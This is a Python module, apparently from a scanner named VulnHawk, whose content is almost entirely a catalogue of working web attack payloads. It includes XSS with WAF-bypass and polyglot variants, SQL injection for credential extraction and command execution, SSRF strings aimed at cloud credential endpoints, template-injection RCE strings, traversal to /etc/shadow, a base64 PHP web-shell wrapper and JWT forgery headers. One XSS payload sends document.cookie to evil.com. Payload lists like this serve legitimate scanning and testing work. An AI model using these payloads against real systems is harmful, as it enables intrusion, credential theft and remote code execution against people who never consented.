"""
VulnHawk Advanced Vulnerability Payloads Database

Contains cutting-edge payloads for comprehensive vulnerability detection:
- WAF bypass techniques
- Polyglot payloads
- Framework-specific exploits
- Modern attack vectors

Author: VulnHawk Team
"""

from dataclasses import dataclass
from typing import List, Dict, Optional
from enum import Enum


class PayloadCategory(Enum):
    """Categories of payloads."""
    BASIC = "basic"
    ADVANCED = "advanced"
    POLYGLOT = "polyglot"
    WAF_BYPASS = "waf_bypass"
    FRAMEWORK_SPECIFIC = "framework_specific"
    BLIND = "blind"
    OUT_OF_BAND = "oob"


@dataclass
class Payload:
    """Represents a single payload."""
    value: str
    category: PayloadCategory
    description: str
    detection_pattern: Optional[str] = None
    bypass_technique: Optional[str] = None
    framework: Optional[str] = None
    severity_boost: float = 0.0  # Additional severity if this payload works


class AdvancedXSSPayloads:
    """Advanced Cross-Site Scripting payloads."""

    # Basic XSS payloads
    BASIC = [
        Payload('<script>alert(1)</script>', PayloadCategory.BASIC, 'Classic script injection'),
        Payload('<img src=x onerror=alert(1)>', PayloadCategory.BASIC, 'Image error handler'),
        Payload('<svg onload=alert(1)>', PayloadCategory.BASIC, 'SVG onload event'),
        Payload('"><script>alert(1)</script>', PayloadCategory.BASIC, 'Attribute breakout'),
        Payload("'-alert(1)-'", PayloadCategory.BASIC, 'JavaScript string breakout'),
    ]

    # Polyglot payloads - work in multiple contexts
    POLYGLOT = [
        Payload(
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
            PayloadCategory.POLYGLOT,
            'Ultimate polyglot - works in HTML, JS, URL contexts',
            bypass_technique='Multi-context injection'
        ),
        Payload(
            '"><img src=x onerror=alert(1)//><svg/onload=alert(1)//></title></style></textarea></script>',
            PayloadCategory.POLYGLOT,
            'Tag closure polyglot',
            bypass_technique='Multiple tag closures'
        ),
        Payload(
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            PayloadCategory.POLYGLOT,
            'Complex polyglot for various contexts'
        ),
    ]

    # WAF Bypass payloads
    WAF_BYPASS = [
        Payload('<svg/onload=alert(1)>', PayloadCategory.WAF_BYPASS, 'No space bypass'),
        Payload('<svg\tonload=alert(1)>', PayloadCategory.WAF_BYPASS, 'Tab character bypass'),
        Payload('<svg\nonload=alert(1)>', PayloadCategory.WAF_BYPASS, 'Newline bypass'),
        Payload('<svg onload=alert`1`>', PayloadCategory.WAF_BYPASS, 'Template literal bypass'),
        Payload('<svg onload=alert&lpar;1&rpar;>', PayloadCategory.WAF_BYPASS, 'HTML entity bypass'),
        Payload('<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>', PayloadCategory.WAF_BYPASS, 'Decimal entity bypass'),
        Payload('<svg onload=\\u0061lert(1)>', PayloadCategory.WAF_BYPASS, 'Unicode escape bypass'),
        Payload('<svg onload=al\\u0065rt(1)>', PayloadCategory.WAF_BYPASS, 'Partial unicode escape'),
        Payload('<img src=x onerror=eval(atob("YWxlcnQoMSk="))>', PayloadCategory.WAF_BYPASS, 'Base64 encoded payload'),
        Payload('<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>', PayloadCategory.WAF_BYPASS, 'CharCode bypass'),
        Payload('<input onfocus=alert(1) autofocus>', PayloadCategory.WAF_BYPASS, 'Autofocus event'),
        Payload('<marquee onstart=alert(1)>', PayloadCategory.WAF_BYPASS, 'Marquee tag bypass'),
        Payload('<details open ontoggle=alert(1)>', PayloadCategory.WAF_BYPASS, 'Details tag bypass'),
        Payload('<body onpageshow=alert(1)>', PayloadCategory.WAF_BYPASS, 'Body pageshow event'),
        Payload('<svg><animate onbegin=alert(1) attributeName=x dur=1s>', PayloadCategory.WAF_BYPASS, 'SVG animate bypass'),
        Payload('<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">click', PayloadCategory.WAF_BYPASS, 'MathML bypass'),
        Payload('{{constructor.constructor("alert(1)")()}}', PayloadCategory.WAF_BYPASS, 'Angular template injection'),
        Payload('${alert(1)}', PayloadCategory.WAF_BYPASS, 'Template literal injection'),
    ]

    # DOM-based XSS payloads
    DOM_BASED = [
        Payload('#<img src=x onerror=alert(1)>', PayloadCategory.ADVANCED, 'Fragment-based DOM XSS'),
        Payload('javascript:alert(document.domain)', PayloadCategory.ADVANCED, 'JavaScript protocol'),
        Payload('data:text/html,<script>alert(1)</script>', PayloadCategory.ADVANCED, 'Data URI XSS'),
        Payload('"><script>document.location="http://evil.com/?c="+document.cookie</script>', PayloadCategory.ADVANCED, 'Cookie stealing payload'),
    ]

    # Framework-specific XSS
    FRAMEWORK_SPECIFIC = [
        # React
        Payload('{{constructor.constructor("return this")().alert(1)}}', PayloadCategory.FRAMEWORK_SPECIFIC, 'React dangerouslySetInnerHTML bypass', framework='react'),
        # Angular
        Payload('{{$on.constructor("alert(1)")()}}', PayloadCategory.FRAMEWORK_SPECIFIC, 'Angular sandbox escape', framework='angular'),
        Payload('{{constructor.constructor(\'alert(1)\')()}}', PayloadCategory.FRAMEWORK_SPECIFIC, 'Angular constructor bypass', framework='angular'),
        # Vue.js
        Payload('{{_c.constructor("alert(1)")()}}', PayloadCategory.FRAMEWORK_SPECIFIC, 'Vue.js template injection', framework='vue'),
        # jQuery
        Payload('$("<img src=x onerror=alert(1)>")', PayloadCategory.FRAMEWORK_SPECIFIC, 'jQuery HTML injection', framework='jquery'),
    ]

    # Mutation XSS (mXSS) payloads
    MUTATION_XSS = [
        Payload('<noscript><p title="</noscript><img src=x onerror=alert(1)>">', PayloadCategory.ADVANCED, 'mXSS noscript mutation'),
        Payload('<p><style><![CDATA[</style><img src=x onerror=alert(1)>//]]></style></p>', PayloadCategory.ADVANCED, 'mXSS CDATA mutation'),
        Payload('<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>', PayloadCategory.ADVANCED, 'mXSS math/table mutation'),
    ]

    @classmethod
    def get_all(cls) -> List[Payload]:
        """Get all XSS payloads."""
        return cls.BASIC + cls.POLYGLOT + cls.WAF_BYPASS + cls.DOM_BASED + cls.FRAMEWORK_SPECIFIC + cls.MUTATION_XSS

    @classmethod
    def get_by_category(cls, category: PayloadCategory) -> List[Payload]:
        """Get payloads by category."""
        all_payloads = cls.get_all()
        return [p for p in all_payloads if p.category == category]


class AdvancedSQLiPayloads:
    """Advanced SQL Injection payloads."""

    # Error-based SQLi
    ERROR_BASED = [
        Payload("' OR '1'='1", PayloadCategory.BASIC, 'Classic OR injection'),
        Payload("' OR '1'='1'--", PayloadCategory.BASIC, 'OR injection with comment'),
        Payload("' OR '1'='1'/*", PayloadCategory.BASIC, 'OR injection with block comment'),
        Payload("admin'--", PayloadCategory.BASIC, 'Comment out password check'),
        Payload("1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--", PayloadCategory.ADVANCED, 'MySQL EXTRACTVALUE error'),
        Payload("1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--", PayloadCategory.ADVANCED, 'MySQL UPDATEXML error'),
        Payload("1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", PayloadCategory.ADVANCED, 'MySQL double query error'),
    ]

    # Boolean-based blind SQLi
    BOOLEAN_BLIND = [
        Payload("' AND '1'='1", PayloadCategory.BLIND, 'Boolean true condition'),
        Payload("' AND '1'='2", PayloadCategory.BLIND, 'Boolean false condition'),
        Payload("' AND SUBSTRING((SELECT database()),1,1)='a", PayloadCategory.BLIND, 'Database name extraction'),
        Payload("' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", PayloadCategory.BLIND, 'Table count check'),
        Payload("1 AND 1=1", PayloadCategory.BLIND, 'Numeric boolean true'),
        Payload("1 AND 1=2", PayloadCategory.BLIND, 'Numeric boolean false'),
    ]

    # Time-based blind SQLi
    TIME_BLIND = [
        Payload("' AND SLEEP(5)--", PayloadCategory.BLIND, 'MySQL sleep'),
        Payload("'; WAITFOR DELAY '0:0:5'--", PayloadCategory.BLIND, 'MSSQL waitfor'),
        Payload("' AND pg_sleep(5)--", PayloadCategory.BLIND, 'PostgreSQL sleep'),
        Payload("' AND BENCHMARK(10000000,SHA1('test'))--", PayloadCategory.BLIND, 'MySQL benchmark'),
        Payload("1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--", PayloadCategory.BLIND, 'PostgreSQL conditional sleep'),
        Payload("'; IF (1=1) WAITFOR DELAY '0:0:5'--", PayloadCategory.BLIND, 'MSSQL conditional delay'),
    ]

    # Union-based SQLi
    UNION_BASED = [
        Payload("' UNION SELECT NULL--", PayloadCategory.ADVANCED, 'Union column count'),
        Payload("' UNION SELECT NULL,NULL--", PayloadCategory.ADVANCED, 'Union 2 columns'),
        Payload("' UNION SELECT NULL,NULL,NULL--", PayloadCategory.ADVANCED, 'Union 3 columns'),
        Payload("' UNION SELECT 1,2,3--", PayloadCategory.ADVANCED, 'Union numeric'),
        Payload("' UNION SELECT table_name,NULL FROM information_schema.tables--", PayloadCategory.ADVANCED, 'Table enumeration'),
        Payload("' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", PayloadCategory.ADVANCED, 'Column enumeration'),
        Payload("' UNION SELECT username,password FROM users--", PayloadCategory.ADVANCED, 'Credential extraction'),
    ]

    # WAF bypass SQLi
    WAF_BYPASS = [
        Payload("'/**/OR/**/1=1--", PayloadCategory.WAF_BYPASS, 'Comment space bypass'),
        Payload("' OR 1=1#", PayloadCategory.WAF_BYPASS, 'Hash comment'),
        Payload("'%20OR%201=1--", PayloadCategory.WAF_BYPASS, 'URL encoded space'),
        Payload("' /*!50000OR*/ 1=1--", PayloadCategory.WAF_BYPASS, 'MySQL version comment'),
        Payload("' OR 0x31=0x31--", PayloadCategory.WAF_BYPASS, 'Hex bypass'),
        Payload("'||'1'='1", PayloadCategory.WAF_BYPASS, 'Concatenation bypass'),
        Payload("' OR 'x'='x", PayloadCategory.WAF_BYPASS, 'String comparison'),
        Payload("'/*!OR*/1=1--", PayloadCategory.WAF_BYPASS, 'Inline comment bypass'),
        Payload("' UNION%0ASELECT%0A1,2,3--", PayloadCategory.WAF_BYPASS, 'Newline bypass'),
        Payload("' uNiOn SeLeCt 1,2,3--", PayloadCategory.WAF_BYPASS, 'Case variation'),
        Payload("' UN/**/ION SEL/**/ECT 1,2,3--", PayloadCategory.WAF_BYPASS, 'Keyword splitting'),
    ]

    # Database-specific payloads
    DATABASE_SPECIFIC = [
        # MySQL
        Payload("' AND @@version LIKE '%MySQL%'--", PayloadCategory.FRAMEWORK_SPECIFIC, 'MySQL detection', framework='mysql'),
        Payload("' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--", PayloadCategory.FRAMEWORK_SPECIFIC, 'MySQL file read', framework='mysql'),
        # PostgreSQL
        Payload("' AND version() LIKE '%PostgreSQL%'--", PayloadCategory.FRAMEWORK_SPECIFIC, 'PostgreSQL detection', framework='postgresql'),
        Payload("'; COPY (SELECT '') TO PROGRAM 'id'--", PayloadCategory.FRAMEWORK_SPECIFIC, 'PostgreSQL command execution', framework='postgresql'),
        # MSSQL
        Payload("' AND @@VERSION LIKE '%Microsoft%'--", PayloadCategory.FRAMEWORK_SPECIFIC, 'MSSQL detection', framework='mssql'),
        Payload("'; EXEC xp_cmdshell('whoami')--", PayloadCategory.FRAMEWORK_SPECIFIC, 'MSSQL command execution', framework='mssql'),
        # Oracle
        Payload("' AND banner LIKE '%Oracle%' FROM v$version WHERE ROWNUM=1--", PayloadCategory.FRAMEWORK_SPECIFIC, 'Oracle detection', framework='oracle'),
        # SQLite
        Payload("' AND sqlite_version() IS NOT NULL--", PayloadCategory.FRAMEWORK_SPECIFIC, 'SQLite detection', framework='sqlite'),
    ]

    # Second-order SQLi
    SECOND_ORDER = [
        Payload("admin'-- ", PayloadCategory.ADVANCED, 'Second-order username injection'),
        Payload("test@test.com' AND 1=1--", PayloadCategory.ADVANCED, 'Second-order email injection'),
    ]

    # NoSQL Injection
    NOSQL = [
        Payload('{"$gt":""}', PayloadCategory.ADVANCED, 'MongoDB greater than'),
        Payload('{"$ne":""}', PayloadCategory.ADVANCED, 'MongoDB not equal'),
        Payload("admin'||'1'=='1", PayloadCategory.ADVANCED, 'MongoDB string injection'),
        Payload('{"username":{"$regex":".*"}}', PayloadCategory.ADVANCED, 'MongoDB regex'),
        Payload("'; return true; var x='", PayloadCategory.ADVANCED, 'MongoDB JavaScript injection'),
    ]

    @classmethod
    def get_all(cls) -> List[Payload]:
        """Get all SQLi payloads."""
        return (cls.ERROR_BASED + cls.BOOLEAN_BLIND + cls.TIME_BLIND +
                cls.UNION_BASED + cls.WAF_BYPASS + cls.DATABASE_SPECIFIC +
                cls.SECOND_ORDER + cls.NOSQL)


class AdvancedSSRFPayloads:
    """Server-Side Request Forgery payloads."""

    LOCALHOST = [
        Payload('http://127.0.0.1', PayloadCategory.BASIC, 'Localhost IPv4'),
        Payload('http://localhost', PayloadCategory.BASIC, 'Localhost hostname'),
        Payload('http://[::1]', PayloadCategory.BASIC, 'Localhost IPv6'),
        Payload('http://0.0.0.0', PayloadCategory.BASIC, 'All interfaces'),
        Payload('http://127.1', PayloadCategory.WAF_BYPASS, 'Shortened localhost'),
        Payload('http://127.0.1', PayloadCategory.WAF_BYPASS, 'Another shortened form'),
        Payload('http://2130706433', PayloadCategory.WAF_BYPASS, 'Decimal IP'),
        Payload('http://0x7f000001', PayloadCategory.WAF_BYPASS, 'Hex IP'),
        Payload('http://0177.0.0.1', PayloadCategory.WAF_BYPASS, 'Octal IP'),
        Payload('http://127.0.0.1.nip.io', PayloadCategory.WAF_BYPASS, 'DNS rebinding service'),
    ]

    CLOUD_METADATA = [
        # AWS
        Payload('http://169.254.169.254/latest/meta-data/', PayloadCategory.ADVANCED, 'AWS metadata endpoint'),
        Payload('http://169.254.169.254/latest/meta-data/iam/security-credentials/', PayloadCategory.ADVANCED, 'AWS IAM credentials'),
        Payload('http://169.254.169.254/latest/user-data', PayloadCategory.ADVANCED, 'AWS user data'),
        # GCP
        Payload('http://metadata.google.internal/computeMetadata/v1/', PayloadCategory.ADVANCED, 'GCP metadata'),
        Payload('http://169.254.169.254/computeMetadata/v1/', PayloadCategory.ADVANCED, 'GCP metadata alt'),
        # Azure
        Payload('http://169.254.169.254/metadata/instance?api-version=2021-02-01', PayloadCategory.ADVANCED, 'Azure metadata'),
        # DigitalOcean
        Payload('http://169.254.169.254/metadata/v1/', PayloadCategory.ADVANCED, 'DigitalOcean metadata'),
    ]

    INTERNAL_SERVICES = [
        Payload('http://192.168.0.1', PayloadCategory.ADVANCED, 'Common router IP'),
        Payload('http://10.0.0.1', PayloadCategory.ADVANCED, 'Internal network'),
        Payload('http://172.16.0.1', PayloadCategory.ADVANCED, 'Internal network B'),
        Payload('gopher://127.0.0.1:6379/_INFO', PayloadCategory.ADVANCED, 'Redis via gopher'),
        Payload('dict://127.0.0.1:6379/INFO', PayloadCategory.ADVANCED, 'Redis via dict'),
        Payload('file:///etc/passwd', PayloadCategory.ADVANCED, 'Local file read'),
    ]

    BYPASS_TECHNIQUES = [
        Payload('http://127.0.0.1:80', PayloadCategory.WAF_BYPASS, 'Explicit port'),
        Payload('http://127.0.0.1:443', PayloadCategory.WAF_BYPASS, 'HTTPS port'),
        Payload('http://127.0.0.1/?@evil.com', PayloadCategory.WAF_BYPASS, 'URL confusion'),
        Payload('http://evil.com#@127.0.0.1', PayloadCategory.WAF_BYPASS, 'Fragment bypass'),
        Payload('http://127.0.0.1\\@evil.com', PayloadCategory.WAF_BYPASS, 'Backslash bypass'),
        Payload('http://127。0。0。1', PayloadCategory.WAF_BYPASS, 'Unicode dot bypass'),
        Payload('http://①②⑦.⓪.⓪.①', PayloadCategory.WAF_BYPASS, 'Enclosed numerics'),
    ]

    @classmethod
    def get_all(cls) -> List[Payload]:
        return cls.LOCALHOST + cls.CLOUD_METADATA + cls.INTERNAL_SERVICES + cls.BYPASS_TECHNIQUES


class AdvancedSSTIPayloads:
    """Server-Side Template Injection payloads."""

    DETECTION = [
        Payload('{{7*7}}', PayloadCategory.BASIC, 'Basic math detection'),
        Payload('${7*7}', PayloadCategory.BASIC, 'Dollar syntax detection'),
        Payload('<%= 7*7 %>', PayloadCategory.BASIC, 'ERB syntax detection'),
        Payload('#{7*7}', PayloadCategory.BASIC, 'Ruby interpolation'),
        Payload('*{7*7}', PayloadCategory.BASIC, 'Thymeleaf detection'),
        Payload('{{7*\'7\'}}', PayloadCategory.BASIC, 'String multiplication'),
    ]

    JINJA2 = [
        Payload("{{config}}", PayloadCategory.FRAMEWORK_SPECIFIC, 'Jinja2 config leak', framework='jinja2'),
        Payload("{{config.items()}}", PayloadCategory.FRAMEWORK_SPECIFIC, 'Jinja2 config items', framework='jinja2'),
        Payload("{{self.__class__.__mro__[2].__subclasses__()}}", PayloadCategory.FRAMEWORK_SPECIFIC, 'Jinja2 subclasses', framework='jinja2'),
        Payload("{{''.__class__.__mro__[1].__subclasses__()}}", PayloadCategory.FRAMEWORK_SPECIFIC, 'Jinja2 RCE prep', framework='jinja2'),
        Payload("{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}", PayloadCategory.FRAMEWORK_SPECIFIC, 'Jinja2 RCE', framework='jinja2'),
    ]

    TWIG = [
        Payload("{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", PayloadCategory.FRAMEWORK_SPECIFIC, 'Twig RCE', framework='twig'),
    ]

    FREEMARKER = [
        Payload("<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", PayloadCategory.FRAMEWORK_SPECIFIC, 'FreeMarker RCE', framework='freemarker'),
    ]

    @classmethod
    def get_all(cls) -> List[Payload]:
        return cls.DETECTION + cls.JINJA2 + cls.TWIG + cls.FREEMARKER


class AdvancedPathTraversalPayloads:
    """Path Traversal / LFI payloads."""

    BASIC = [
        Payload('../../../etc/passwd', PayloadCategory.BASIC, 'Unix passwd'),
        Payload('..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', PayloadCategory.BASIC, 'Windows hosts'),
        Payload('../../../etc/shadow', PayloadCategory.BASIC, 'Unix shadow'),
        Payload('../../../proc/self/environ', PayloadCategory.BASIC, 'Process environment'),
    ]

    BYPASS = [
        Payload('....//....//....//etc/passwd', PayloadCategory.WAF_BYPASS, 'Double encoding'),
        Payload('..%252f..%252f..%252fetc/passwd', PayloadCategory.WAF_BYPASS, 'Double URL encode'),
        Payload('..%c0%af..%c0%af..%c0%afetc/passwd', PayloadCategory.WAF_BYPASS, 'UTF-8 encoding'),
        Payload('..\\../..\\../..\\../etc/passwd', PayloadCategory.WAF_BYPASS, 'Mixed slashes'),
        Payload('..%00/..%00/..%00/etc/passwd', PayloadCategory.WAF_BYPASS, 'Null byte (old)'),
        Payload('/etc/passwd%00.png', PayloadCategory.WAF_BYPASS, 'Null byte extension'),
        Payload('....//....//....//etc/passwd', PayloadCategory.WAF_BYPASS, 'Filter bypass'),
        Payload('/....\\....\\etc\\passwd', PayloadCategory.WAF_BYPASS, 'Backslash bypass'),
    ]

    PHP_WRAPPERS = [
        Payload('php://filter/convert.base64-encode/resource=index.php', PayloadCategory.ADVANCED, 'PHP base64 filter'),
        Payload('php://input', PayloadCategory.ADVANCED, 'PHP input wrapper'),
        Payload('data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=', PayloadCategory.ADVANCED, 'Data wrapper RCE'),
        Payload('expect://id', PayloadCategory.ADVANCED, 'Expect wrapper'),
        Payload('phar://test.phar/test.txt', PayloadCategory.ADVANCED, 'Phar wrapper'),
    ]

    @classmethod
    def get_all(cls) -> List[Payload]:
        return cls.BASIC + cls.BYPASS + cls.PHP_WRAPPERS


class AdvancedJWTPayloads:
    """JWT vulnerability payloads."""

    ALGORITHM_CONFUSION = [
        Payload('{"alg":"none"}', PayloadCategory.ADVANCED, 'Algorithm none attack'),
        Payload('{"alg":"None"}', PayloadCategory.ADVANCED, 'Algorithm None case variation'),
        Payload('{"alg":"NONE"}', PayloadCategory.ADVANCED, 'Algorithm NONE uppercase'),
        Payload('{"alg":"nOnE"}', PayloadCategory.ADVANCED, 'Algorithm mixed case'),
        Payload('{"alg":"HS256"}', PayloadCategory.ADVANCED, 'RS256 to HS256 confusion'),
    ]

    HEADER_INJECTION = [
        Payload('{"alg":"HS256","kid":"../../../../../../dev/null"}', PayloadCategory.ADVANCED, 'KID path traversal'),
        Payload('{"alg":"HS256","kid":"key\' UNION SELECT \'secret\'--"}', PayloadCategory.ADVANCED, 'KID SQL injection'),
        Payload('{"alg":"HS256","jku":"http://evil.com/jwks.json"}', PayloadCategory.ADVANCED, 'JKU spoofing'),
        Payload('{"alg":"RS256","x5u":"http://evil.com/key.pem"}', PayloadCategory.ADVANCED, 'X5U spoofing'),
    ]

    @classmethod
    def get_all(cls) -> List[Payload]:
        return cls.ALGORITHM_CONFUSION + cls.HEADER_INJECTION


class AdvancedGraphQLPayloads:
    """GraphQL-specific vulnerability payloads."""

    INTROSPECTION = [
        Payload('{"query":"{__schema{types{name}}}"}', PayloadCategory.BASIC, 'Schema introspection'),
        Payload('{"query":"{__schema{queryType{name}mutationType{name}}}"}', PayloadCategory.BASIC, 'Query type discovery'),
        Payload('{"query":"{__schema{types{name,fields{name,args{name,type{name}}}}}}"}', PayloadCategory.ADVANCED, 'Full schema dump'),
    ]

    INJECTION = [
        Payload('{"query":"{ user(id: \\"1 OR 1=1\\") { name } }"}', PayloadCategory.ADVANCED, 'SQLi in argument'),
        Payload('{"query":"mutation { updateUser(id: 1, name: \\"<script>alert(1)</script>\\") { name } }"}', PayloadCategory.ADVANCED, 'XSS in mutation'),
    ]

    DOS = [
        Payload('{"query":"{ user { friends { friends { friends { friends { name } } } } } }"}', PayloadCategory.ADVANCED, 'Nested query DoS'),
        Payload('{"query":"query { __typename @a @b @c @d @e @f @g @h @i @j }"}', PayloadCategory.ADVANCED, 'Directive overload'),
    ]

    @classmethod
    def get_all(cls) -> List[Payload]:
        return cls.INTROSPECTION + cls.INJECTION + cls.DOS


class PayloadManager:
    """Manager for all payload categories."""

    def __init__(self):
        self.xss = AdvancedXSSPayloads()
        self.sqli = AdvancedSQLiPayloads()
        self.ssrf = AdvancedSSRFPayloads()
        self.ssti = AdvancedSSTIPayloads()
        self.path_traversal = AdvancedPathTraversalPayloads()
        self.jwt = AdvancedJWTPayloads()
        self.graphql = AdvancedGraphQLPayloads()

    def get_payloads(self, vuln_type: str, category: Optional[PayloadCategory] = None) -> List[Payload]:
        """Get payloads for a specific vulnerability type."""
        payload_map = {
            'xss': self.xss.get_all,
            'sqli': self.sqli.get_all,
            'sql_injection': self.sqli.get_all,
            'ssrf': self.ssrf.get_all,
            'ssti': self.ssti.get_all,
            'lfi': self.path_traversal.get_all,
            'path_traversal': self.path_traversal.get_all,
            'jwt': self.jwt.get_all,
            'graphql': self.graphql.get_all,
        }

        getter = payload_map.get(vuln_type.lower())
        if not getter:
            return []

        payloads = getter()
        if category:
            payloads = [p for p in payloads if p.category == category]

        return payloads

    def get_waf_bypass_payloads(self, vuln_type: str) -> List[Payload]:
        """Get WAF bypass payloads for a vulnerability type."""
        return self.get_payloads(vuln_type, PayloadCategory.WAF_BYPASS)

    def get_advanced_payloads(self, vuln_type: str) -> List[Payload]:
        """Get advanced payloads for a vulnerability type."""
        return self.get_payloads(vuln_type, PayloadCategory.ADVANCED)


# Global payload manager instance
payload_manager = PayloadManager()


def get_payloads(vuln_type: str, category: Optional[str] = None) -> List[str]:
    """
    Convenience function to get payload strings.

    Args:
        vuln_type: Type of vulnerability (xss, sqli, ssrf, etc.)
        category: Optional category filter (basic, advanced, waf_bypass, etc.)

    Returns:
        List of payload strings
    """
    cat = PayloadCategory(category) if category else None
    payloads = payload_manager.get_payloads(vuln_type, cat)
    return [p.value for p in payloads]
